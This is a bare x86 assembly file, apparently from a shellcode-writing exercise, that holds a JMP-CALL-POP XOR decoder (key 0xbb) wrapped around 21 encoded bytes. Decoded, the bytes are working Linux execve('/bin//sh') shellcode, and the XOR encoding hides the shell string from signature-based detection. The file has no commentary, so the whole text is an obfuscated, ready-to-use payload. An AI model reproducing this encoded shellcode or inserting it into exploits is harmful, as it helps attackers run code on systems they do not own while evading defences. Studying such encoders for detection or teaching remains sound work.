
section .text 
global main

main:
    jmp short decoder 


temp:
    pop edi
    xor ecx,ecx 
    mov cl,21

loop1:
    xor byte [edi],0xbb
    inc edi 
    loop loop1

    jmp short shellcode



decoder:

    call temp 
    shellcode: db 0x8a,0x7b,0xeb,0xd3,0x94,0x94,0xc8,0xd3,0xd3,0x94,0xd9,0xd2,0xd5,0x32,0x58,0x32,0x7a,0xb,0xb0,0x76,0x3b



